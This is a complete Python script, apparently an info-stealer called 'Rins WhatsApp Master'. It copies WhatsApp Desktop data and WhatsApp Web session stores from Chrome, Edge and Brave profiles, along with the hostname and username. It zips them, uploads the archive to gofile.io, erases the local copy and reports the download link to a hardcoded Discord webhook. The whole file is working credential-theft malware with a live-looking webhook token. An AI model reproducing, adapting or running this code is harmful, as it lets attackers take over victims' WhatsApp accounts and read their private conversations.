import os
import sys
import time
import json
import shutil
import socket
import tempfile
import traceback
from pathlib import Path

import requests

try:
    import dhooks
except Exception as _e:
    dhooks = None
    _DHOOKS_IMPORT_ERR = str(_e)
else:
    _DHOOKS_IMPORT_ERR = None

# PSG > OM

WEBHOOK = "https://discord.com/api/webhooks/1553035523835035731/0RpTshpc0RiUfuKV2IDP3YH8gptecvencCaKFYOVV6N-eW_kRWW5fd5aR-yq_vF0i-YT"

AVATAR = ("https://github.com/rinsfx/WhatsappMaster/blob/master/"
          "assets/whatsapp.png?raw=true")

LOG_PATH = Path(tempfile.gettempdir()) / "wmaster.log"


def log(msg):
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
    except Exception:
        pass


def log_exc(tag):
    log(f"--- EXCEPTION in {tag} ---")
    log(traceback.format_exc())


DESKTOP_DIR = Path(os.getenv("LOCALAPPDATA", "")) / "Packages" / \
              "5319275A.WhatsAppDesktop_cv1g1gvanyjgm"

CHROME_ROOTS = {
    "chrome": Path(os.getenv("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data",
    "edge":   Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data",
    "brave":  Path(os.getenv("LOCALAPPDATA", "")) / "BraveSoftware" / "Brave-Browser" / "User Data",
}

WA_SUBPATHS = [
    Path("IndexedDB") / "https.web.whatsapp.com_0.indexeddb.leveldb",
    Path("IndexedDB") / "https_web.whatsapp.com_0.indexeddb.leveldb",
    Path("Local Storage") / "leveldb",
    Path("Session Storage"),
    Path("Preferences"),
]

SKIP_PROFILES = {"Guest Profile", "System Profile"}


def load_config():
    candidates = [
        Path(__file__).resolve().with_name("config.json"),
        Path.cwd() / "config.json",
        Path(sys.executable).resolve().with_name("config.json"),
    ]
    for cfg_path in candidates:
        log(f"checking config: {cfg_path} exists={cfg_path.exists()}")
        if cfg_path.exists():
            try:
                with open(cfg_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                log(f"loaded config from {cfg_path}")
                return data
            except Exception:
                log_exc(f"load_config {cfg_path}")

    log("no config found, using defaults + injected WEBHOOK")
    return {
        "webhook": WEBHOOK,
        "targets": ["desktop", "chrome"],
        "chrome_browsers": ["chrome", "edge", "brave"],
        "max_zip_mb": 200,
        "retries": 10,
        "retry_delay_sec": 2
    }


def copytree_safe(src: Path, dst: Path):
    try:
        if dst.exists():
            shutil.rmtree(dst, ignore_errors=True)
        shutil.copytree(src, dst)
        return True, None
    except PermissionError as e:
        return False, f"locked: {e}"
    except Exception as e:
        return False, str(e)


def collect_desktop(stage: Path, manifest: dict):
    log(f"desktop target check: {DESKTOP_DIR} exists={DESKTOP_DIR.exists()}")
    if not DESKTOP_DIR.exists():
        manifest["targets"].append({"type": "desktop", "status": "skipped",
                                     "reason": "path not found",
                                     "path": str(DESKTOP_DIR)})
        return
    dst = stage / "desktop"
    ok, err = copytree_safe(DESKTOP_DIR, dst)
    entry = {"type": "desktop", "path": str(DESKTOP_DIR)}
    if ok:
        entry["status"] = "ok"
        log("desktop collected ok")
    else:
        entry["status"] = "skipped"
        entry["reason"] = err
        log(f"desktop skipped: {err}")
        if dst.exists():
            shutil.rmtree(dst, ignore_errors=True)
    manifest["targets"].append(entry)


def collect_chrome(stage: Path, manifest: dict, browsers: list):
    for bname in browsers:
        root = CHROME_ROOTS.get(bname)
        log(f"chrome root {bname}: {root} exists={bool(root and root.exists())}")
        if not root or not root.exists():
            continue

        for profile in root.iterdir():
            if not profile.is_dir():
                continue
            if profile.name in SKIP_PROFILES:
                continue
            if profile.name != "Default" and not profile.name.startswith("Profile "):
                continue

            entry = {"type": "chrome", "browser": bname, "profile": profile.name}
            dst_profile = stage / "chrome" / bname / profile.name
            dst_profile.mkdir(parents=True, exist_ok=True)

            copied_any = False
            for sub in WA_SUBPATHS:
                src_sub = profile / sub
                if not src_sub.exists():
                    continue
                dst_sub = dst_profile / sub
                ok, err = copytree_safe(src_sub, dst_sub) if src_sub.is_dir() \
                    else _copy_file(src_sub, dst_sub)
                if ok:
                    copied_any = True
                    log(f"chrome {bname}/{profile.name}/{sub} ok")
                else:
                    entry["status"] = "partial"
                    entry.setdefault("warnings", []).append(f"{sub}: {err}")
                    log(f"chrome {bname}/{profile.name}/{sub} fail: {err}")

            if "status" not in entry:
                entry["status"] = "ok" if copied_any else "skipped"
                if not copied_any:
                    entry["reason"] = "no whatsapp data"

            manifest["targets"].append(entry)


def _copy_file(src: Path, dst: Path):
    try:
        dst.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(src, dst)
        return True, None
    except Exception as e:
        return False, str(e)


def upload_to_gofile(path: Path, retries: int, delay: int):
    log(f"upload start: {path} size={path.stat().st_size if path.exists() else 'MISSING'}")
    for i in range(retries):
        try:
            server = requests.get(
                "https://api.gofile.io/getServer", timeout=15
            ).json()["data"]["server"]
            log(f"gofile server: {server} (attempt {i+1})")
            with open(path, "rb") as fh:
                r = requests.post(
                    f"https://{server}.gofile.io/uploadFile",
                    files={"file": fh},
                    timeout=300
                ).json()
            link = r["data"]["downloadPage"]
            log(f"upload ok: {link}")
            return link
        except Exception:
            log_exc(f"upload attempt {i+1}")
            time.sleep(delay)
    log("upload failed after all retries")
    return False


def send_webhook(url: str, host: str, link: str, targets: list):
    if dhooks is None:
        log(f"dhooks unavailable: {_DHOOKS_IMPORT_ERR}")
        log(f"would-be payload: host={host} link={link}")
        return
    tgt_str = ", ".join(
        f"{t.get('type')}"
        + (f"/{t.get('browser')}/{t.get('profile')}" if t.get("type") == "chrome" else "")
        for t in targets
    ) or "none"

    message = "**Rins WhatsApp Master Report**\n\n"
    message += f"📌 Pc: {host}\n"
    message += f"🎯 Targets: {tgt_str}\n"
    message += f"🔍 Url: {link}"

    embed = dhooks.Embed(
        title="🔔 Grab Alert",
        description=message,
        color=0xFF5733
    )

    hook = dhooks.Webhook(
        url=url,
        username="Rins WhatsApp Master",
        avatar_url=AVATAR
    )
    hook.send(embed=embed)
    log("webhook sent")


def main():
    try:
        log("=" * 50)
        log("=== payload start ===")
        log(f"cwd={os.getcwd()}")
        log(f"exe={sys.executable}")
        log(f"LOCALAPPDATA={os.getenv('LOCALAPPDATA')}")
        log(f"dhooks_import_ok={dhooks is not None}")

        cfg = load_config()
        webhook_url = cfg.get("webhook") or WEBHOOK
        retries = int(cfg.get("retries", 10))
        delay = int(cfg.get("retry_delay_sec", 2))
        browsers = cfg.get("chrome_browsers", ["chrome", "edge", "brave"])
        targets_wanted = cfg.get("targets", ["desktop", "chrome"])
        log(f"webhook set: {bool(webhook_url)}")
        log(f"targets_wanted: {targets_wanted}")

        host = socket.gethostname()
        ts = int(time.time())

        stage = Path(tempfile.gettempdir()) / f"wmaster_{host}_{ts}"
        stage.mkdir(parents=True, exist_ok=True)
        log(f"stage: {stage}")

        manifest = {
            "host": host,
            "user": os.getenv("USERNAME", ""),
            "ts": ts,
            "targets": []
        }

        if "desktop" in targets_wanted:
            collect_desktop(stage, manifest)

        if "chrome" in targets_wanted:
            collect_chrome(stage, manifest, browsers)

        with open(stage / "manifest.json", "w", encoding="utf-8") as f:
            json.dump(manifest, f, indent=2)

        archive_base = Path(tempfile.gettempdir()) / f"wmaster_{host}_{ts}"
        zip_path = Path(shutil.make_archive(str(archive_base), "zip", str(stage)))
        log(f"zip: {zip_path} size={zip_path.stat().st_size}")
        shutil.rmtree(stage, ignore_errors=True)

        link = upload_to_gofile(zip_path, retries, delay)

        try:
            zip_path.unlink()
            log("zip cleaned")
        except Exception:
            log_exc("zip unlink")

        if link:
            try:
                send_webhook(webhook_url, host, link, manifest["targets"])
            except Exception:
                log_exc("send_webhook")
        else:
            log("no link, skipping webhook")

        log("=== payload done ===")
    except Exception:
        log_exc("main")


if __name__ == "__main__":
    main()
